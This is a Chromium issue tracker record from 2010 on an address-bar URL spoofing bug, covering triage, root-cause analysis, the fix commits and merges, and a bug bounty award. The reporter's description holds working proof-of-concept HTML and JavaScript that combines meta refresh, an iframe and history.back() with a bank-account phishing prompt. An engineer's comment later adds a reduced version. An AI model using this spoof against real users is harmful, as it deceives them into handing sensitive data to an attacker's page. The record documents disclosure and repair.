# Omnibox url spoofing on pending events in page unload

| Field | Value |
|-------|-------|
| **Issue ID** | [40082627](https://issues.chromium.org/issues/40082627) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink |
| **Reporter** | ku...@gmail.com |
| **Assignee** | jc...@chromium.org |
| **Created** | 2010-08-10 |
| **Bounty** | $500.00 |

## Description

<META HTTP-EQUIV="refresh" CONTENT="0;url=index.htm">  <!-- if CONTENT >1 address bar will not dispaly chrome://newtab/ -->
<iframe src="spoof.htm"></iframe>
index.htm
====================
<script>
setTimeout('sleep()',500);
alert(2); //alert twice
function sleep()
{
document.write("123<br>");
var mes = prompt('Dear user:\nI need your Bank account number','');
document.write(mes+"<br>");
}
</script>

spoof.htm
===========
<script>
document.documentURI=eval();
history.back(null)
//debug alert(1)
</script>

put index.htm spoof.htm 127.0.0.1
open a new tab visit http://127.0.0.1

## Timeline

### in...@chromium.org (2010-08-10)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-08-10)

Darin, Mihai, Brett, any idea who can be a good owner for this. 

Lets say you navigate to a site like google.com. Then, lets visit the evil site - http://infernohacks.com/t/index.htm . Here is what happens.

1. An alert dialog appears with number 2.
2. Click on OK.
3. See the domain changed to the last visited url (google.com).
4. The page is still processing events from evil site. 
5. You will see another alert dialog. 
6. Click on OK.
7. You will see a prompt with the document.write contents. (exploit does not work if the document.writes are removed)


### ku...@gmail.com (2010-08-10)

[Comment Deleted]

### ku...@gmail.com (2010-08-10)

[Comment Deleted]

### ku...@gmail.com (2010-08-11)

[Comment Deleted]

### ku...@gmail.com (2010-08-11)

[Comment Deleted]

### ku...@gmail.com (2010-08-11)

[Comment Deleted]

### ku...@gmail.com (2010-08-11)

[Comment Deleted]

### js...@chromium.org (2010-08-11)

[Empty comment from Monorail migration]

### mi...@chromium.org (2010-08-12)

There's some timing issues that I don't quite understand. If I use the http://infernohacks.com/t/index.htm test case, then I can wait as long as I want on the first alert and the bug still happens. I copied the test case (index.htm and spoof.htm to http://persistent.info/webkit/test-cases/inferno/index.htm), but there I have to dismiss the first alert pretty quickly, otherwise the navigation happens as expected.

I have a modified test case at http://persistent.info/webkit/test-cases/url-spoof/index.htm which logs the time that the first alert was visible, and it looks like it needs to be visible for < 500ms, otherwise the navigation happens as expected.

Since this involves a <meta> refresh with a <1 second timeout, the fact that doesn't generate a history entry may also be relevant: http://trac.webkit.org/browser/trunk/WebCore/loader/RedirectScheduler.cpp#L244

### ku...@gmail.com (2010-08-13)

[Comment Deleted]

### ku...@gmail.com (2010-08-13)

[Comment Deleted]

### in...@chromium.org (2010-08-18)

Kuzzcc, too many comments and unhelpful comments just make it harder for us to do our job. please make fewer comments and not repeat testcases. Also, your comment in #12 for popup blocker is not a issue since user is manually running the command in devtools (and is unrelated to this issue).

The bug is more serious than we earlier thought. I have found a much more reliable and reduced testcase which does not require any alert and gets rid of many extra statements.
---------
index.htm
---------
<META HTTP-EQUIV="refresh" CONTENT="0;url=index.htm">
<iframe src="spoof.htm"></iframe>
<script>
setTimeout(function(){},50);
</script>
---------
spoof.htm
---------
<script>
history.back(null);
</script>

----try it on infernohacks.com/t/index.htm [first go to any site e.g. www.google.com]----. if does not reproduce, please clear your cache.

Darin, Brett, can you please to find an owner for this or point us someplace where the issue might be.

### in...@chromium.org (2010-08-18)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-08-18)

It does seem to have some similarity to http://code.google.com/p/chromium/issues/detail?id=43967. so ccing +rohitrao, +shess.

Note that in this bug, you can spoof the address bar but only to a site that exists in your history. so, secseverity-medium instead of high.

### ku...@gmail.com (2010-08-19)

[Comment Deleted]

### ku...@gmail.com (2010-08-19)

[Comment Deleted]

### in...@chromium.org (2010-08-19)

kuzzcc, this bug is not about popup blocker bypass, it is about url bar spoofing.i have reduced it down to a workable state in https://crbug.com/chromium/51680#c13. your new testcase in https://crbug.com/chromium/51680#c17 (which just adds a window.open to google.com) is a popup blocker bypass for chrome v5 (does not affect v6 trunk). it is only reproducible if you open the attacker's evil site url directly in url bar. (on a new tab page). it does not reproduce if you already visited some site on that tab. we had some popup blocker issues in v5, that got fixed recently, so that is why it does not reproduce on trunk.

Please note that mixing the url bar spoofing bug (far far more important) and popup blocker bypass bug (which is just v5 and only reproduces on typing url in a new tag page) has created too much confusion. I have been trying to get attention of Darin and Brett to help workout the owner for url bar spoofing issue, but too many comments and mixing of issues has already spammed everyone. 

If you come across any new issue, please file a new bug.


### br...@chromium.org (2010-08-19)

I'm starting to look at this.

### br...@chromium.org (2010-08-19)

I keep trying to look at this but I'm realistically too overloaded right now and I haven't gotten enough time to make any progress.

I suggest Jay who's done a bunch with TabContents, or Mark or Pinkerton, who are looking at refactoring this code.

### jc...@chromium.org (2010-08-24)

I can repro with inferno reduced case (see 13).
What happens is that the history.back() causes the NavigationController to set the pending entry to google.com.
But by the time the renderer loads that entry, the reload as already happened.
The NavigationController ends up getting (in NavigationController::RendererDidNavigateToExistingPage) committing the navigation but does not discard the pending entry, so it still looks as if we are on google.com.
There is some code in NavigationController::RendererDidNavigateToExistingPage to only discard the pending entry if it is the entry we are navigating to. If I discard it every time, it fixes this bug but causes a regression in the NavigationControllerTest.Back_OtherBackPending unit-test.
I need to figure-out what the right behavior is.



### jc...@chromium.org (2010-08-24)

I can repro with inferno reduced case (see 13).
What happens is that the history.back() causes the NavigationController to set the pending entry to google.com.
But by the time the renderer loads that entry, the reload has already happened.
The NavigationController ends up getting (in NavigationController::RendererDidNavigateToExistingPage) committing the navigation but does not discard the pending entry, so it still looks as if we are on google.com.
There is some code in NavigationController::RendererDidNavigateToExistingPage to only discard the pending entry if it is the entry we are navigating to. If I discard it every time, it fixes this bug but causes a regression in the NavigationControllerTest.Back_OtherBackPending unit-test.
I need to figure-out what the right behavior is.



### jc...@chromium.org (2010-08-24)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-08-26)

[Empty comment from Monorail migration]

### bu...@gmail.com (2010-09-01)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=58261 

------------------------------------------------------------------------
r58261 | jcivelli@chromium.org | 2010-09-01 16:01:51 -0700 (Wed, 01 Sep 2010) | 8 lines
Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/back_forward_menu_model_unittest.cc?r1=58261&r2=58260
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/renderer_host/test/test_render_view_host.cc?r1=58261&r2=58260
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/sessions/tab_restore_service_browsertest.cc?r1=58261&r2=58260
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tab_contents/navigation_controller_unittest.cc?r1=58261&r2=58260
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tab_contents/render_view_host_manager_unittest.cc?r1=58261&r2=58260
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tab_contents/tab_contents.cc?r1=58261&r2=58260
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tab_contents/tab_contents.h?r1=58261&r2=58260
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tab_contents/test_tab_contents.cc?r1=58261&r2=58260
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tab_contents/test_tab_contents.h?r1=58261&r2=58260
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/translate/translate_manager_unittest.cc?r1=58261&r2=58260

Don't create pending entries when a navigation is initiated by the page.
If the page reloads while such a navigation happens, we could end up with the wrong pending entry.
Also make sure TestTabContents::NavigateAndCommit() does commit on the right RVH.

BUG=51680
TEST=See bug for steps.

Review URL: http://codereview.chromium.org/3257002
------------------------------------------------------------------------


### in...@chromium.org (2010-09-01)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-09-01)

Fix looks pretty complicated for v6 merge. Moving to v7 and fixunreleased.

### bu...@gmail.com (2010-09-07)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=58701 

------------------------------------------------------------------------
r58701 | jcivelli@chromium.org | 2010-09-07 09:29:54 -0700 (Tue, 07 Sep 2010) | 12 lines
Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/back_forward_menu_model_unittest.cc?r1=58701&r2=58700
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/renderer_host/test/test_render_view_host.cc?r1=58701&r2=58700
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/sessions/tab_restore_service_browsertest.cc?r1=58701&r2=58700
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tab_contents/navigation_controller_unittest.cc?r1=58701&r2=58700
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tab_contents/render_view_host_manager_unittest.cc?r1=58701&r2=58700
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tab_contents/tab_contents.cc?r1=58701&r2=58700
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tab_contents/tab_contents.h?r1=58701&r2=58700
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tab_contents/test_tab_contents.cc?r1=58701&r2=58700
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tab_contents/test_tab_contents.h?r1=58701&r2=58700
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/translate/translate_manager_unittest.cc?r1=58701&r2=58700

Relanding this:

Don't create pending entries when a navigation is initiated by the page.
If the page reloads while such a navigation happens, we could end up with the wrong pending entry. Also make sure TestTabContents::NavigateAndCommit() does commit on the right RVH.

BUG=51680
TEST=See bug for steps.
TBR=creis
Review URL: http://codereview.chromium.org/3257002


Review URL: http://codereview.chromium.org/3346005
------------------------------------------------------------------------


### jc...@chromium.org (2010-09-28)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-09-28)

Looks like we just branched before r58701 for v7 :(. Moving status back to WillMerge.

### in...@chromium.org (2010-09-28)

Jay, we should merge this to 517 [it has stayed on the trunk for a while now]. This bug is an omnibox spoof and https://crbug.com/chromium/54262 is the spoof of ssl indicator which is quite serious. We didn't merge to v6 because we wanted this change to stay on the trunk for some time.

### in...@chromium.org (2010-09-29)

Merged in r60963

### bu...@gmail.com (2010-09-29)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=60963

------------------------------------------------------------------------
r60963 | inferno@chromium.org | Wed Sep 29 10:59:06 PDT 2010

Changed paths:
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/navigation_controller_unittest.cc?r1=60963&r2=60962&pathrev=60963
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/test_tab_contents.cc?r1=60963&r2=60962&pathrev=60963
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/tab_contents.cc?r1=60963&r2=60962&pathrev=60963
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/back_forward_menu_model_unittest.cc?r1=60963&r2=60962&pathrev=60963
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/renderer_host/test/test_render_view_host.cc?r1=60963&r2=60962&pathrev=60963
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/test_tab_contents.h?r1=60963&r2=60962&pathrev=60963
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/tab_contents.h?r1=60963&r2=60962&pathrev=60963
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/sessions/tab_restore_service_browsertest.cc?r1=60963&r2=60962&pathrev=60963
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/render_view_host_manager_unittest.cc?r1=60963&r2=60962&pathrev=60963
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/translate/translate_manager_unittest.cc?r1=60963&r2=60962&pathrev=60963

Merge 58701 - Relanding this:

Don't create pending entries when a navigation is initiated by the page.
If the page reloads while such a navigation happens, we could end up with the wrong pending entry. Also make sure TestTabContents::NavigateAndCommit() does commit on the right RVH.

BUG=51680
TEST=See bug for steps.
TBR=creis
Review URL: http://codereview.chromium.org/3257002


Review URL: http://codereview.chromium.org/3346005

Review URL: http://codereview.chromium.org/3537005
------------------------------------------------------------------------

### in...@chromium.org (2010-09-29)

Had a chat with Anthony, this is a high risk merge for the 517 beta releasing soon. We will get it in m8, but reverting my r60963 for now.

### bu...@gmail.com (2010-09-29)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=60965

------------------------------------------------------------------------
r60965 | inferno@chromium.org | Wed Sep 29 11:09:47 PDT 2010

Changed paths:
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/navigation_controller_unittest.cc?r1=60965&r2=60964&pathrev=60965
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/test_tab_contents.cc?r1=60965&r2=60964&pathrev=60965
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/tab_contents.cc?r1=60965&r2=60964&pathrev=60965
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/back_forward_menu_model_unittest.cc?r1=60965&r2=60964&pathrev=60965
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/renderer_host/test/test_render_view_host.cc?r1=60965&r2=60964&pathrev=60965
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/test_tab_contents.h?r1=60965&r2=60964&pathrev=60965
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/tab_contents.h?r1=60965&r2=60964&pathrev=60965
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/sessions/tab_restore_service_browsertest.cc?r1=60965&r2=60964&pathrev=60965
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/render_view_host_manager_unittest.cc?r1=60965&r2=60964&pathrev=60965
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/translate/translate_manager_unittest.cc?r1=60965&r2=60964&pathrev=60965

Revert 60963 - Merge 58701 - Relanding this:

Don't create pending entries when a navigation is initiated by the page.
If the page reloads while such a navigation happens, we could end up with the wrong pending entry. Also make sure TestTabContents::NavigateAndCommit() does commit on the right RVH.

BUG=51680
TEST=See bug for steps.
TBR=creis
Review URL: http://codereview.chromium.org/3257002


Review URL: http://codereview.chromium.org/3346005

Review URL: http://codereview.chromium.org/3537005

TBR=inferno@chromium.org
Review URL: http://codereview.chromium.org/3585002
------------------------------------------------------------------------

### in...@chromium.org (2010-09-29)

[Empty comment from Monorail migration]

### [Deleted User] (2010-10-07)

Please merge this to 517 branch. Thanks.

Reproducible with Google Chrome	7.0.517.36 (Official Build 61761)

### la...@chromium.org (2010-10-08)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-10-08)

[Empty comment from Monorail migration]

### js...@chromium.org (2010-10-10)

[Empty comment from Monorail migration]

### js...@chromium.org (2010-10-10)

[Empty comment from Monorail migration]

### js...@chromium.org (2010-10-10)

Apparently the guy who has reported multiple (including one public) dupes of this bug also publicly disclosed it back on 8 September in the following blog post:
https://www.alternativ-testing.fr/blog/index.php?post/2010/Google-Chrome-Location-bar-Spoofing

I'm going to flip this back as a merge candidate for m7. What were the major issues that prevented us from merging in the first place?

### in...@chromium.org (2010-10-10)

I looked and i think it wasn't really a compile failure on mac - http://chrome-master.mtv:8010/builders/google%20chrome%20mac%20beta/builds/904. So, we should be ok on the merge for 517.

Waiting for Anthony's final call, given the exploit is public.

### la...@chromium.org (2010-10-10)

Feel free to talk to me offline, but the very short of it is that we're not going to play w/ the Omnibox/navigation controller 7 days before a release.  The risk in this case exceeds the benefit since the next beta branch will be cut in less than 36 hours.

### bu...@gmail.com (2010-10-12)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=62309

------------------------------------------------------------------------
r62309 | inferno@chromium.org | Tue Oct 12 11:34:32 PDT 2010

Changed paths:
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/navigation_controller_unittest.cc?r1=62309&r2=62308&pathrev=62309
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/test_tab_contents.cc?r1=62309&r2=62308&pathrev=62309
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/tab_contents.cc?r1=62309&r2=62308&pathrev=62309
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/back_forward_menu_model_unittest.cc?r1=62309&r2=62308&pathrev=62309
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/renderer_host/test/test_render_view_host.cc?r1=62309&r2=62308&pathrev=62309
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/test_tab_contents.h?r1=62309&r2=62308&pathrev=62309
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/tab_contents.h?r1=62309&r2=62308&pathrev=62309
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/sessions/tab_restore_service_browsertest.cc?r1=62309&r2=62308&pathrev=62309
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/tab_contents/render_view_host_manager_unittest.cc?r1=62309&r2=62308&pathrev=62309
 M http://src.chromium.org/viewvc/chrome/branches/517/src/chrome/browser/translate/translate_manager_unittest.cc?r1=62309&r2=62308&pathrev=62309

Merge 58701 - Relanding this:

Don't create pending entries when a navigation is initiated by the page.
If the page reloads while such a navigation happens, we could end up with the wrong pending entry. Also make sure TestTabContents::NavigateAndCommit() does commit on the right RVH.

BUG=51680
TEST=See bug for steps.
TBR=creis
Review URL: http://codereview.chromium.org/3257002


Review URL: http://codereview.chromium.org/3346005


Review URL: http://codereview.chromium.org/3655007
------------------------------------------------------------------------

### in...@chromium.org (2010-10-12)

Talked with Anthony on this merge. Putting labels back.

### sc...@gmail.com (2010-10-14)

Inferno or Anthony - can you confirm this is merged for the first M7 stable release?

### sc...@gmail.com (2010-10-15)

Confirmed merged for M7.

### sc...@gmail.com (2010-10-15)

@kuzzcc: congratulations! We were eventually able to derive a nice URL spoof out of this. We will provisionally reward this at the $500 level.
----
Boilerplate text: please do NOT publicly disclose details until a fix has been
released to our users. Public disclosure may cancel the provisional reward.
----

### ku...@gmail.com (2010-10-16)

Thanks for the reward

### sc...@gmail.com (2010-10-20)

[Empty comment from Monorail migration]

### sc...@gmail.com (2010-10-27)

Payment is in the electronic system.

### [Deleted User] (2010-11-02)

With a clear profile...

Navigating to google.com and then to http://infernohacks.com/t/index.htm, the renderer stays on http://infernohacks.com/t/index.htm

This is with Google Chrome 7.0.517.44 (Official Build 64615)


### js...@chromium.org (2010-11-23)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/51680?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/54261, crbug.com/chromium/58672]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082627)*
